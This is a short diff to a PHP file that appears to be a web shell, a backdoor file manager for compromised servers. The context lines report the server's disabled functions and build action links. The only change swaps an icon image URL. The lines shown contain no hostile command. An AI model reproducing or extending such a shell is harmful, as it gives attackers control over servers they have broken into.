@@ -188,7 +188,7 @@ $pers =  (int) ($free/$total*100);
 $ds = @ini_get("disable_functions");
 $show_ds = (!empty($ds)) ? "<a href='?dir=$dir&aksi=disabfunc' class='ds'>$ds</a>" : "<a href='?dir=$dir&aksi=disabfunc'><font color=green>NONE</font></a>";
 $imgfol = "<img src='https://i.ibb.co/gvswgCb/folder-icon-256-1787672482.png' class='ico'></img>";
-$imgfile = "<img src='http://icons.iconarchive.com/icons/zhoolego/material/256/Filetype-Docs-icon.png' class='ico2'></img>";
+$imgfile = "<img src='https://i.ibb.co/sKzrj4q/Filetype-Docs-icon.png' class='ico2'></img>";
 function formatSize( $bytes ){
   $types = array( 'B', 'KB', 'MB', 'GB', 'TB' );
   for( $i = 0; $bytes >= 1024 && $i < ( count( $types ) -1 ); $bytes /= 1024, $i++ );
